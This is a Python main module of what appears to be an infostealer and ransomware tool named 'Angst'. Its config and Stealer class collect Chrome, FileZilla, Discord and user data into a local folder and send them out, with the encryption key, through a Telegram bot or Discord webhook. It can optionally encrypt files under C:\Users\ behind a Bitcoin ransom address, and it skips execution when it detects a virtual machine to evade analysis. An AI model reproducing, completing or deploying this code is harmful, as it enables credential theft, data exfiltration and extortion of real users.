# -*- coding: utf-8 -*-
import os
import base64
from colorama import *
from plugins.antivm import AntiVM
from plugins.filezilla import FileZilla
from plugins.discord import Discord
from plugins.send_telegram import Send_Telegram
from plugins.send_discord import Send_Discord
from plugins.user import User
from plugins.chrome import Chrome
from plugins.ransomware import Ransomware
from plugins.cleanup import CleanUp

CONFIG = {
    "webhook" : "",
    "chrome" : True,
    "filezilla":True,
    "userdata":True,
    "discord":True,
    "send_discord": False,
    "send_telegram": True,
    "telegram_token": "",
    "telegram_chat_id": "",
    "ransomware" : {
        "enabled" : False,
        "target_dir" : "C:\\Users\\", 
        "extenstion" : ".angst",
        "btcAddy" : "",
        "email" : "charge@d0xbin.org"
    }
}

class Stealer():
    def __init__(self):
        self.antivm = AntiVM()
        self.filezilla = FileZilla()
        self.user = User()
        self.chrome = Chrome()
        self.discord = Discord()
        self.ransomware_key = os.urandom(32)
        self.log()
        if CONFIG["send_discord"] == True:
            self.send = Send_Discord(CONFIG["webhook"],
                            self.user.userdata,
                            base64.b64encode(self.ransomware_key),
                            CONFIG["ransomware"]["enabled"])
        else:
            pass
        if CONFIG["send_telegram"] == True:
            self.send = Send_Telegram(CONFIG["telegram_token"],
                            CONFIG["telegram_chat_id"],
                            self.user.userdata,
                            base64.b64encode(self.ransomware_key),
                            CONFIG["ransomware"]["enabled"])
        else:
            pass            
        self.rangst()
        self.cleanup = CleanUp()
        print("Done!")

    def log(self):
        app_data = os.getenv("LOCALAPPDATA")
        temp = os.path.join(app_data, "Angst")
        os.mkdir(temp)
        if self.filezilla.saved != "" and CONFIG["filezilla"] == True:
            with open(temp + "\\filezilla.txt", "w") as filezilla_file:
                filezilla_file.write(self.filezilla.saved)
                filezilla_file.flush()
                filezilla_file.close()

        if self.user.userdata != "" and CONFIG["userdata"] == True:
            with open(temp + "\\user.txt", "w") as user_file:
                user_file.write(self.user.userdata)
                user_file.flush()
                user_file.close()

        if self.chrome.stored != "" and CONFIG["chrome"] == True:
            with open(temp + "\\chrome.txt", "w") as chrome_file:
                chrome_file.write(self.chrome.stored)
                chrome_file.flush()
                chrome_file.close()

        if self.discord.saved != "" and CONFIG["discord"] == True:
            with open(temp + "\\discord.txt", "w") as discord_file:
                discord_file.write(self.discord.saved)
                discord_file.flush()
                discord_file.close()

    def rangst(self):
        """
        """
        if CONFIG["ransomware"]["enabled"]:
            Ransomware(self.ransomware_key,
                       CONFIG["ransomware"]["target_dir"],
                       CONFIG["ransomware"]["extenstion"],
                       CONFIG["ransomware"]["btcAddy"],
                       CONFIG["ransomware"]["email"])

init(convert=True)

if __name__ == "__main__":
    if AntiVM().inVM() == False:
        Stealer()
